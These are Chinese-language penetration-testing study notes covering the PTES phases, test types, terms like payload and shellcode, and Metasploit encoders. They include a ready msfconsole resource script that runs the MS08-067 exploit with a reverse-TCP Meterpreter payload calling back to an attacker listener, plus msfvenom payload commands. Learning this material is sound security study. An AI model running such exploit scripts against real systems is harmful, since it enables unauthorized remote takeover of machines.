# Penetration Testig 渗透测试

PTTES: Penetration Testing Execution Standard
## PTES渗透测试阶段
1. 前期交互阶段
2. 情报搜集阶段
3. 威胁建模阶段
4. 漏洞分析阶段
5. 渗透攻击阶段
6. 后渗透攻击阶段
7. 报告阶段

渗透测试类型: 
白盒测试; 拥有所有内部知识,可以在不需要害怕被阻断的情况下任意的实施攻击.
黑盒测试; 获取目标系统访问权代价最小的攻击路径,并保证不被检测到.
灰盒测试; 灰盒测试部分了解内部知识,可以和目标用户进行沟通。

漏洞扫描器是用来找出指定系统或应用中的安全漏洞的自动化工具.渗透测试的美妙之处在于它不是一个千篇一律的自动化过程,成功地攻击系统通常需要你掌握更多的知识和技能.

### 专业术语
渗透攻击(Exploit); 

攻击载荷(Payload);

shellcode是在渗透攻击时作为攻击载荷运行的一组机器指令.通常以汇编语言编写,目标系统执行了shellcode这一组指令后,才会提供一个命令行shell或Meterpreter shell,这也是shellcode名称的由来.

exploit module 渗透攻击模块和auxiliary module 辅助模块.

MSF终端(msfconsole) 可以用它发起一次渗透攻击,装载辅助模块,实施查点,创建监听器,或者对整个网络进行自动化渗透攻击.

POC: Proof of Concept 渗透攻击的概念验证代码

MSF编码器
由MSF攻击载荷生成器产生的shellcode是完全可运行的,但是其中包含了一些null空字符,在一些程序进行解析时,这些空字符串会被认为是字符串的结束,从而使得代码在完整执行之前被截断而终止运行,简单地来说\x00和\xff字符会破坏你的攻击载荷.

> 编码器
x86/shikata_ga_nai编码器,在Metasploit中唯一一个拥有Excellent等级的编码器,而这种等级是基于一个模块的可靠性和稳定性来评价的.
查看编码器及相关等级使用: msfvenom -l encoders.

> 了解汇编代码含义
Nasm_shell.rb在对应给定的汇编命令找出它的opcode操作码,可以使用
cd /usr/share/metasploit-framework/tools/exploit
./nasm_shell.rb
nasm > jmp esp



> 自动化运行MS08-067脚本 /home/scripts/reverse_tcp.rc
```rc
use exploit /windows/smb/ms08_067_netapi
set RHOST [IP]
set payload windows/meterpreter/reverse_tcp
set LHOST [IP]
run
# 执行
./msfconsole -r /home/scripts/reverse_tcp.rc
```

对某个攻击载荷模块感兴趣却不清楚它的配置选项时,采用payload-options就可以列出所必须和可选二点选项列表
msfvenom -p windows/shell_reverse_tcp --payload-options

参考:

Metasploit渗透测试指南.pdf